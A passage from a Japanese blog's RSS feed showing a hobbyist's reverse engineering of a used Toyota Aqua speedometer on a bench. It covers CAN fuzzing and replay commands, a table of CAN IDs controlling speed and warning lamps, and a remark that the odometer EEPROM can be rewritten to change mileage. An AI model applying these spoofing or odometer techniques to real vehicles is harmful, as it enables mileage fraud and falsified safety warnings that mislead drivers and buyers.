&lt;li&gt;メーカー: デンソー&lt;/li&gt;
&lt;li&gt;型番: 83800-5CF71&lt;/li&gt;
&lt;li&gt;使用車種: アクア NHP-10 (2013年製造)&lt;/li&gt;
&lt;li&gt;端子1: 40pin
&lt;ul&gt;
&lt;li&gt;コネクタ: 90980-12557 
025型NHシリーズ40極F側コネクタ / 40P025K-NH-F&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;端子2 : 13pin
&lt;ul&gt;
&lt;li&gt;コネクタ :  90980-12767&lt;br&gt;
13P(090型)-SMHMメス端子側コネクタ / 13P090K-SMHM-F&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;
  &lt;img src=&#34;ecu_pins.png&#34; alt=&#34;ecu_pins&#34;&gt;
&lt;/p&gt;
&lt;p&gt;ピン数がめちゃくちゃ多い。&lt;/p&gt;
&lt;h1 id=&#34;ハードウェア解析&#34;&gt;ハードウェア解析&lt;/h1&gt;
&lt;p&gt;解析というほどできていない。ただの紹介である。&lt;/p&gt;
&lt;h2 id=&#34;ハードウェア仕様&#34;&gt;ハードウェア仕様&lt;/h2&gt;
&lt;p&gt;
  &lt;img src=&#34;cpu_rom.png&#34; alt=&#34;cpu_rom&#34;&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CPU: MB91F047
&lt;ul&gt;
&lt;li&gt;富士通製MCU。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;EEPROM: 93C66a
&lt;ul&gt;
&lt;li&gt;ODOメータ管理用。このチップを外しROMライタで書き換えることでODOメータの数値を好きに変えることができる。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;denso-デバッグポート&#34;&gt;DENSO デバッグポート&lt;/h2&gt;
&lt;p&gt;DENSOが工場で使っているデバッグポートがある。ここにアクセスすることでもEEPROMの内容を書き換えることができる模様。&lt;/p&gt;
&lt;p&gt;ピンはそれぞれ「UINA」「UOUTA」「TEST1」「TEST2」と表記されており、実際にこのポートを使ってEEPROMの内容を書き換える怪しい製品が売っている (SFTool, iProg+, M Toolなど)。&lt;/p&gt;
&lt;p&gt;ただ残念ながら書き換えるための技術的な情報はノウハウのためか公開されていない。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;debug_port.png&#34; alt=&#34;&#34;&gt;
&lt;/p&gt;
&lt;h2 id=&#34;電源通信用ピンの特定&#34;&gt;電源・通信用ピンの特定&lt;/h2&gt;
&lt;p&gt;アクアのコンビネーションメータは、40ピンコネクタと13ピンコネクタの合計53ピンある。&lt;/p&gt;
&lt;p&gt;GNDピンはGNDのレイヤとの導通チェックで、IG+ピンは電源回路っぽいパターンから追うとすぐに推測が可能。&lt;br&gt;
見つけ方は前回の記事で紹介している。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.shutingrz.com/post/summon-real-ecu/&#34;&gt;リアルECUを召喚して本物のCAN通信の雰囲気を知る&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;しかし、CAN-H、CAN-Lに関しては前回と違いピンが多すぎて推測が困難。&lt;/p&gt;
&lt;h3 id=&#34;電子技術マニュアル&#34;&gt;電子技術マニュアル&lt;/h3&gt;
&lt;p&gt;この問題を解決するのがトヨタが発行・販売している電子技術マニュアル。&lt;br&gt;
電子技術マニュアルは車種ごとに発行されており、CD媒体で販売される。&lt;br&gt;
新品の流通ルートはディーラーらしいが、中古であればヤフオク等でも手に入る。&lt;/p&gt;
&lt;p&gt;電子技術マニュアルの「修理書」から、「内装ボデー&amp;amp;エレクトリカル」→「メーター」→「メーター&amp;amp;ゲージシステム」→「ECU端子配列」の順に開いていけばピンアサインが載っている。&lt;/p&gt;
&lt;p&gt;ピンアサインは以下。&lt;br&gt;
※端子1の右上を1、左下を40として数えていく。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;IG+: 21&lt;/li&gt;
&lt;li&gt;GND: 20&lt;/li&gt;
&lt;li&gt;CAN-H: 31&lt;/li&gt;
&lt;li&gt;CAN-L: 32&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;
  &lt;img src=&#34;meter_pinassign.png&#34; alt=&#34;meter_pinassign&#34;&gt;
&lt;/p&gt;
&lt;p&gt;このとおりに接続すると無事に起動する。&lt;/p&gt;
&lt;h1 id=&#34;can通信解析&#34;&gt;CAN通信解析&lt;/h1&gt;
&lt;p&gt;スピードメーターを起動すると、以下のようなデータがひたすら垂れ流される。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  can0  RX - -  442   [8]  42 04 00 00 02 00 00 00   &amp;#39;B.......&amp;#39;
  can0  RX - -  610   [8]  20 00 00 64 C0 FF FF 20   &amp;#39; ..d... &amp;#39;
  can0  RX - -  4A6   [8]  08 90 07 FE FE FE FE 00   &amp;#39;........&amp;#39;
  can0  RX - -  610   [8]  20 00 00 64 C0 FF FF 20   &amp;#39; ..d... &amp;#39;
  can0  RX - -  611   [8]  21 00 00 10 00 02 58 B8   &amp;#39;!.....X.&amp;#39;
  can0  RX - -  616   [8]  2B 00 00 00 00 00 00 00   &amp;#39;+.......&amp;#39;
  can0  RX - -  613   [8]  28 00 80 00 00 00 00 00   &amp;#39;(.......&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ただ今回のハックの目的は通信を見ることではなく、データを送ってメーターがどういう表示になるかという点なので無視する。&lt;/p&gt;
&lt;h4 id=&#34;odoメータ&#34;&gt;ODOメータ&lt;/h4&gt;
&lt;p&gt;ちなみにCANID: 611 の5~8バイトはODOメータ(総走行距離)の内容になっている。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;02 58 B8 =&amp;gt; 153784 (km)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;canデータファジングをしてみる&#34;&gt;CANデータファジングをしてみる&lt;/h2&gt;
&lt;p&gt;CANIDが 0 ~ 7FF の全てについて、全データFFなデータを送ってみる。&lt;/p&gt;
&lt;p&gt;ファジングに使うツールはcan-utilsに入っているcangen。candumpが使える環境ならcangenも使える。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# cangen can0 -g 4 -I i -L 8 -D FFFFFFFFFFFFFFFF -n 2048 -v -v
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;動画を撮ったのでぜひどうぞ。&lt;/p&gt;

&lt;div style=&#34;position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;&#34;&gt;
  &lt;iframe src=&#34;https://www.youtube.com/embed/rMZjkm46sYY&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;&#34; allowfullscreen title=&#34;YouTube Video&#34;&gt;&lt;/iframe&gt;
&lt;/div&gt;

&lt;p&gt;たまごっちがお亡くなりになった時みたいな音が鳴り響く。結構うるさい。&lt;/p&gt;
&lt;p&gt;ファジング中、様々な表示灯や警告ブザー、そして車速が変わったのがわかると思う。&lt;/p&gt;
&lt;h2 id=&#34;cangencanplayerを使って車速周りを特定する&#34;&gt;cangen、canplayerを使って車速周りを特定する&lt;/h2&gt;
&lt;p&gt;ファジングで車速が変わることを確認した。&lt;br&gt;
よって何らかのCANIDで特定のデータを送ればスピードメーターが変わることがわかる。&lt;/p&gt;
&lt;p&gt;ということで今回はGUIではなくCUIツールであるcangenとcanplayerを使って車速周りを特定していく。&lt;/p&gt;
&lt;h3 id=&#34;ファジングデータの生成&#34;&gt;ファジングデータの生成&lt;/h3&gt;
&lt;p&gt;まずは candump を使って SocketCANコンパクト形式でCANデータを記録・保存する。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# candump can0 -l
Disabled standard output while logging.

Enabling Logfile &amp;#39;candump-2019-08-11_145103.log&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→&amp;rsquo;candump-2019-08-11_145103.log&amp;rsquo;というファイル名で保存される。&lt;/p&gt;
&lt;p&gt;candumpをバックグラウンドで動かしながらcangenでファジングする。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# cangen can0 -g 4 -I i -L 8 -D FFFFFFFFFFFFFFFF -n 2048 -v -v
  can0  000   [8]  FF FF FF FF FF FF FF FF
  can0  001   [8]  FF FF FF FF FF FF FF FF
(snip)
  can0  7FE   [8]  FF FF FF FF FF FF FF FF
  can0  7FF   [8]  FF FF FF FF FF FF FF FF
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;オプションの意味。&lt;br&gt;
-g 4		: 通信間隔 4ms&lt;br&gt;
-I i		: CANIDを0x000からインクリメント&lt;br&gt;
-L 8		: データサイズは8バイト&lt;br&gt;
-D FFFFFFFFFFFFFFFF : データペイロード「FFFFFFFFFFFFFFFF 」&lt;br&gt;
-n 2048	: 通信回数。0からCANIDをインクリメントして2048回通信するので 0x000 ~ 0x7FF まで全てなめてくれる。&lt;br&gt;
-v -v 	: ただの冗長表示オプション。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;通信が終了したらcandumpを終了させる。&lt;/p&gt;
&lt;p&gt;結果、&amp;lsquo;candump-2019-08-11_145103.log&amp;rsquo;というファイルでファジングデータを含むCAN通信がダンプされる。&lt;/p&gt;
&lt;p&gt;ここからgrepしてファジングデータを取り出す。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# grep &amp;#34;FFFFFFFFFFFF&amp;#34; candump-2019-08-11_145103.log &amp;gt; candump-FF.log
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;これで CANID 0x000 から 0x7FF の、全てのデータが FF で埋まっているデータが手に入る！&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;ワンライナーでcan-idを絞りながらリプレイ攻撃&#34;&gt;ワンライナーでCAN IDを絞りながらリプレイ攻撃&lt;/h3&gt;
&lt;p&gt;canplayerはSocketCANコンパクト形式のログデータを標準入力からリプレイすることが可能。&lt;/p&gt;
&lt;p&gt;candump-FF.log が下記のような形式のとき、&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;(1565531468.574284) can0 000#FFFFFFFFFFFFFFFF
(1565531468.578885) can0 001#FFFFFFFFFFFFFFFF
(1565531468.583324) can0 002#FFFFFFFFFFFFFFFF
...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ログにはCANインターフェイス名のあとにCANIDが記録されているので、CANID: 0x000 ~ 0x0FF のデータが取り出せる。&lt;br&gt;
そしてこれをパイプでcanplayer に食わせる。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# grep &amp;#34;can0 0&amp;#34; candump-FF.log | canplayer can0=can0
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;canplayer の オプションの意味。(canplayer &amp;ndash;help)&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt; Interface assignment:
 0..n assignments like &amp;lt;write-if&amp;gt;=&amp;lt;log-if&amp;gt;
 e.g. vcan2=can0 (send frames received from can0 on vcan2)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ログに残っている インターフェイス名の置換ルールであり、同じcan0でやるなら can0=can0 とすればいい。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;こうすると CANID 0x000 ~ 0x0FF かつ データ FFFFFFFFFFFFFFFF なCANメッセージが送られる。&lt;/p&gt;
&lt;p&gt;データを送ったところスピードメーターが180kmを指すことを確認した。&lt;/p&gt;
&lt;p&gt;あとは二分探索法みたいにファジングするCANIDの範囲を狭めていき特定していくことになる。grepやheadコマンドを使えば送るCANIDの範囲を簡単に調整できる。&lt;/p&gt;
&lt;br/&gt;
&lt;h4 id=&#34;前半0x000--0x07fを送る&#34;&gt;前半(0x000 ~ 0x07F)を送る&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# grep &amp;#34;can0 0&amp;#34; candump-FF.log| head -n 128 | canplayer can0=can0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→速度は変わらなかった。&lt;/p&gt;
&lt;h4 id=&#34;後半0x080--0x0ffを送る&#34;&gt;後半(0x080 ~ 0x0FF)を送る&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# grep &amp;#34;can0 0&amp;#34; candump-FF.log| tail -n 128 | canplayer can0=can0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→速度が変わった。0x080 ~ 0x0FF の範囲である。&lt;/p&gt;
&lt;h4 id=&#34;0x080-から-64-個送る&#34;&gt;0x080 から 64 個送る&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# grep &amp;#34;can0 0&amp;#34; candump-FF.log | tail -n 128 | head -n 64 | canplayer can0=can0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→速度が変わった。0x080 から64 個の範囲である。&lt;/p&gt;
&lt;h4 id=&#34;0x080-から-32-個送る&#34;&gt;0x080 から 32 個送る&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# grep &amp;#34;can0 0&amp;#34; candump-FF.log | tail -n 128 | head -n 32 | canplayer can0=can0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→変わらない。&lt;/p&gt;
&lt;h4 id=&#34;0x0a0-から-32個送る&#34;&gt;0x0A0 から 32個送る&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# grep &amp;#34;can0 0&amp;#34; candump-FF.log | tail -n 128 | head -n 64 | tail -n 32 | canplayer can0=can0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→変わった。0x0A0 から32 個の範囲である。&lt;br&gt;
32は0x10 * 2 でありキリがいいので grep でCAN IDを絞る。&lt;/p&gt;
&lt;h4 id=&#34;0x0a0--0x0af&#34;&gt;0x0A0 ~ 0x0AF&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# grep &amp;#34;can0 0A&amp;#34; candump-FF.log | canplayer can0=can0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→変わらない。&lt;/p&gt;
&lt;h4 id=&#34;0x0b0--0x0bf&#34;&gt;0x0B0 ~ 0x0BF&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# grep &amp;#34;can0 0B&amp;#34; candump-FF.log | canplayer can0=can0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→変わった。0x0B0 ~ 0x0BF の範囲である。&lt;/p&gt;
&lt;h4 id=&#34;0x0b0--0b8&#34;&gt;0x0B0 ~ 0B8&lt;/h4&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# grep &amp;#34;can0 0B&amp;#34; candump-FF.log | head -n 8 | canplayer can0=can0
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;→変わった。0x0B0 ~ 0x0B8 の範囲である&lt;/p&gt;
&lt;p&gt;もうここまでくると8個から1個を推測するだけなので、cansend で打っていく。&lt;/p&gt;
&lt;p&gt;&amp;hellip;&lt;/p&gt;
&lt;p&gt;&amp;hellip;結果、&lt;strong&gt;車速に関するCAN IDは 0x0b4 だった&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;なお、データ部8バイトのうちどのバイト部が車速を示すかどうかについては、cansendで各バイトデータを00にしてみたりFFにしてみたりするだけなので割愛。&lt;br&gt;
コツを書いておくと、バイト単位ではなくビット単位で考えるとよい。&lt;/p&gt;
&lt;p&gt;結果、6バイト目の1バイトが車速に関する部分ということがわかった。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# cangen can0 -g 4 -I 0b4 -L 8 -D 0000000000450000  -v -v
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上記のように 4ms間隔で6バイト目に45を入れておけば、スピードメーターは180kmを指す。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;speed_max.png&#34; alt=&#34;speed_max&#34;&gt;
&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;こんなことを繰り返し車速以外も特定していく。&lt;br&gt;
そしてCANID・データ部と機能の対応表ができあがった。&lt;/p&gt;
&lt;h2 id=&#34;アクア-メーター機能対応表&#34;&gt;アクア メーター機能対応表&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;CANID&lt;/th&gt;
&lt;th&gt;データ部&lt;/th&gt;
&lt;th&gt;意味&lt;/th&gt;
&lt;th&gt;備考&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;0x0b4&lt;/td&gt;
&lt;td&gt;00 00 00 00 00 XX 00 00&lt;/td&gt;
&lt;td&gt;車速&lt;/td&gt;
&lt;td&gt;XX =&amp;gt; Speed &lt;br /&gt;車速の絶対値というか単位時間あたりの回転数のような感じ。短い時間に複数回送ると0 ~ 180kmの範囲で速度が上昇する。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x1C4&lt;/td&gt;
&lt;td&gt;00 00 00 00 00 00 00 01&lt;/td&gt;
&lt;td&gt;EV表示&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x247&lt;/td&gt;
&lt;td&gt;XX XX 00 00 00 00 00 00&lt;/td&gt;
&lt;td&gt;ハイブリッドシステムインジケーター&lt;/td&gt;
&lt;td&gt;XX =&amp;gt; インジケータのメモリ&lt;br /&gt;1バイト目は最下位ビットのみ見ている&lt;br /&gt;ちなみに1バイト目下位ビットが0かつ上位ビットが1のときエラー音が鳴る&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x394&lt;/td&gt;
&lt;td&gt;NO CARE&lt;/td&gt;
&lt;td&gt;エレクトリック　パワーステアリング (EPS) 警告灯&lt;/td&gt;
&lt;td&gt;該当CAN IDの通信が1秒以内の間隔で発生している限り、警告灯が消灯する。&lt;br /&gt;1秒以上通信を発生させなかったらEPS警告灯が表示され、ピーッ！と鳴る&lt;br /&gt;&lt;br /&gt;データは何でもいい&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x3B0&lt;/td&gt;
&lt;td&gt;00 00 00 XX 00 00 00 00&lt;/td&gt;
&lt;td&gt;車外気温&lt;/td&gt;
&lt;td&gt;XX =&amp;gt; 気温&lt;br /&gt;0x08 (-40℃) ～ 0x62 (50℃) &lt;br /&gt;該当CAN IDの通信が10秒以内の間隔で発生しているとき、その通信の該当バイト部によって温度が表示される。&lt;br /&gt;10秒以上通信を発生させなかったら「E」という文字が表示される&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x3B6&lt;/td&gt;
&lt;td&gt;NO CARE&lt;/td&gt;
&lt;td&gt;バッテリー残量&lt;/td&gt;
&lt;td&gt;該当CAN IDの通信が3秒以内の間隔で発生しているとき、バッテリーメモリが1になる&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;00 00 XX 00 00 00 00 00&lt;/td&gt;
&lt;td&gt;P ポジション要求表示灯&lt;/td&gt;
&lt;td&gt;0x08 (00001000) : 点灯&amp;amp;ピーッ！と長く鳴る&lt;br /&gt;0x80 (10000000) : 点灯&amp;amp;ピッ！と短く鳴る&lt;br /&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;00 00 XX 00 00 00 00 00&lt;/td&gt;
&lt;td&gt;バッテリー残量&lt;/td&gt;
&lt;td&gt;00000XXX : バッテリーメモリ&lt;br /&gt;0 ～ 7 (3ビット)の範囲でメモリが増減する&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;00 00 00 XX 00 00 00 00 00&lt;/td&gt;
&lt;td&gt;READY インジケータ&lt;/td&gt;
&lt;td&gt;0x04 (00000100) : 点滅&lt;br /&gt;0x10 (00010000) : 点灯&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;00 00 00 XX 00 00 00 00 00&lt;/td&gt;
&lt;td&gt;警告ブザー&lt;/td&gt;
&lt;td&gt;0x08 (00001000) : ピッと短く鳴る&lt;br /&gt;一度鳴ったら該当ビットが0になるまで鳴らない&lt;br /&gt;※恐らくREADY インジケータに関係あり&lt;br /&gt;説明書「READY インジケータが点滅から点灯にかわり、ブザーが鳴れば、ハイブリッドシステムは正常に始動しています。」&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;00 00 00 XX 00 00 00 00 00&lt;/td&gt;
&lt;td&gt;充電警告灯&lt;/td&gt;
&lt;td&gt;0x20 (00100000) : 点灯&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;00 00 00 00 XX 00 00 00&lt;/td&gt;
&lt;td&gt;ハイブリッドシステム異常警告灯&lt;/td&gt;
&lt;td&gt;0x10 (00010000) : 高速点滅&lt;br /&gt;0x20 (00100000) : 低速点滅&lt;br /&gt;取り扱い説明書には「警告灯の点灯に合わせて警告ブザーが鳴ります」とあるが、このビットだけでは鳴らない&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x3B7&lt;/td&gt;
&lt;td&gt;NO CARE&lt;/td&gt;
&lt;td&gt;ブレーキ警告灯&lt;br /&gt;ABS&amp;amp;ブレーキアシスト警告灯&lt;br /&gt;スリップ表示灯&lt;/td&gt;
&lt;td&gt;該当CAN IDの通信が1秒以上途絶えると、警告灯が点灯する。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;00 XX 00 00 00 00 00 00&lt;/td&gt;
&lt;td&gt;スリップ表示灯&lt;/td&gt;
&lt;td&gt;0x00 (00000000) : 消灯&lt;br /&gt;0x02 (00000010) : 高速点滅&lt;br /&gt;0x04 (00000100) : 低速点滅&lt;br /&gt;0x07 (00000111) : 点灯&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;XX 00 00 00 00 00 00 00&lt;/td&gt;
&lt;td&gt;電子制御ブレーキ警告灯&lt;/td&gt;
&lt;td&gt;0x00 (00000000) : 消灯&lt;br /&gt;0x02 (00000010) : 低速点滅&lt;br /&gt;0x04 (00000100) : 高速点滅&lt;br /&gt;0x07 (00000111) : 点灯&lt;br /&gt;※一度表示が切り替わると通信が途絶えても状態が続く&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;XX 00 00 00 00 00 00 00&lt;/td&gt;
&lt;td&gt;ABS&amp;amp;ブレーキアシスト警告灯&lt;/td&gt;
&lt;td&gt;0x00 (00000000) : 消灯&lt;br /&gt;0x10 (00010000) : 高速点滅&lt;br /&gt;0x18 (00011000) : 点灯&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;XX 00 00 00 00 00 00 00&lt;/td&gt;
&lt;td&gt;ブレーキ警告灯&lt;/td&gt;
&lt;td&gt;0x00 (00000000) : 消灯&lt;br /&gt;0x40 (01000000) : 点灯&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x3B9&lt;/td&gt;
&lt;td&gt;F0 00 00 00 00 00 00 00&lt;/td&gt;
&lt;td&gt;高水温警告灯&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x3BB&lt;/td&gt;
&lt;td&gt;40 00 00 00 00 00 00 00&lt;/td&gt;
&lt;td&gt;エレクトリック　パワーステアリング (EPS) 警告灯&lt;/td&gt;
&lt;td&gt;該当CAN IDの通信が1秒以上途絶えると、警告灯が点灯する&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x3BC&lt;/td&gt;
&lt;td&gt;00 00 00 00 00 XX 00 00&lt;/td&gt;
&lt;td&gt;ECO MODE 表示灯&lt;/td&gt;
&lt;td&gt;0x01 (00000001) : 点灯&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;00 00 00 00 00 XX 00 00&lt;/td&gt;
&lt;td&gt;シフトポジション表示灯&lt;/td&gt;
&lt;td&gt;0x02 (00000010): B&lt;br /&gt;0x08 (00001000) : D&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;00 XX 00 00 00 00 00 00&lt;/td&gt;
&lt;td&gt;シフトポジション表示灯&lt;/td&gt;
&lt;td&gt;0x08 (00001000) : N&lt;br /&gt;0x10 (00010000) : R ※ブザーも同時に鳴る&lt;br /&gt;0x20 (00100000) : P&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x400 ~ 43F&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;謎の警告ブザー&amp;amp;充電警告灯&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;0x421&lt;/td&gt;
&lt;td&gt;00 XX 00 00 00 00 00 00&lt;/td&gt;
&lt;td&gt;ハイブリッドシステム加熱警告灯&lt;/td&gt;
&lt;td&gt;0x01 (00000001) : 点灯とブザー &lt;br /&gt;0x02 (00000010) : 点灯&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;00 XX 00 00 00 00 00 00&lt;/td&gt;
&lt;td&gt;駆動用電池残量低下警告灯&lt;br /&gt;Pポジション要求表示灯&lt;/td&gt;
&lt;td&gt;0x04 (00000100) : 2つのアイコン点滅とブザー&lt;br /&gt;0x08 (00001000) : 駆動用電池残量低下警告灯の点滅と「ピーッピーッ」とブザーが複数回多く鳴る&lt;br /&gt;0x10 (00010000) : 駆動用電池残量低下警告灯の点滅と「ピーーーッ」とブザーが非常に長く鳴る&lt;br /&gt;0x80 (10000000) : 「ピーーーッ」とブザーだけ非常に長く鳴る&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;XX 00 00 00 00 00 00 00&lt;/td&gt;
&lt;td&gt;充電警告灯&lt;/td&gt;
&lt;td&gt;0x80 (10000000) : 点滅&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;hr&gt;
&lt;p&gt;色々特定できて満足！&lt;/p&gt;
&lt;h1 id=&#34;ps3のコントローラでスピードメーターを操作&#34;&gt;PS3のコントローラでスピードメーターを操作&lt;/h1&gt;
&lt;p&gt;最後はグランドフィナーレとして、PS3のコントローラでスピードメーターを操作してみた。&lt;/p&gt;

&lt;div style=&#34;position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;&#34;&gt;
  &lt;iframe src=&#34;https://www.youtube.com/embed/5ZJSc0vtP5E&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;&#34; allowfullscreen title=&#34;YouTube Video&#34;&gt;&lt;/iframe&gt;
&lt;/div&gt;

&lt;br/&gt;
&lt;p&gt;以下の順序で動かしている。&lt;/p&gt;
&lt;ol start=&#34;0&#34;&gt;
&lt;li&gt;起動時に各種警告灯を消去&lt;/li&gt;
&lt;li&gt;R2でスピードを変化&lt;/li&gt;
&lt;li&gt;十字キー 上下で外気温の変化&lt;/li&gt;
&lt;li&gt;十字キー 左右でHVインジケータの変化&lt;/li&gt;
&lt;li&gt;丸、バツ、四角、三角ボタンでシフトポジションの変化&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;ジョイスティックの動きに合わせてCAN通信を出すだけなので非常に簡単。&lt;br&gt;
ソースコードは下においている。&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/shutingrz/aqua-meter-joy&#34;&gt;aqua-meter-joy&lt;/a&gt;&lt;/p&gt;
&lt;br/&gt;
&lt;h1 id=&#34;まとめ&#34;&gt;まとめ&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;ヤフオクからアクアのスピードメーターを買ってきた&lt;/li&gt;
&lt;li&gt;通信を解析した&lt;/li&gt;
&lt;li&gt;解析結果を使ってPS3コントローラで動かしてみた&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;あとは診断プロトコルの解析をしてKWP2000であることを突き止めたけど、SecurityAccess突破できないしレスポンス仕様が全くKWP2000に準拠してないしで難航したのでここには記載していない。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;解析の息抜きにエンジンECUを買ってしまったので、次はエンジンECUに関する記事を書きたいです。&lt;/p&gt;
</description>
      <image>
        <url>https://www.shutingrz.com/cover.png</url>
        <title>アクアのスピードメーターを解析してPS3のコントローラで動かす</title>
        <link>https://www.shutingrz.com/post/aqua-meter-hack/</link>
      </image>
    </item>
    
    
    

    
    <item>
      <title>リアルECUを召喚して本物のCAN通信の雰囲気を知る</title>
      <link>https://www.shutingrz.com/post/summon-real-ecu/</link>
      <pubDate>Sun, 04 Aug 2019 00:47:55 +0900</pubDate>
      
      <guid>https://www.shutingrz.com/post/summon-real-ecu/</guid>
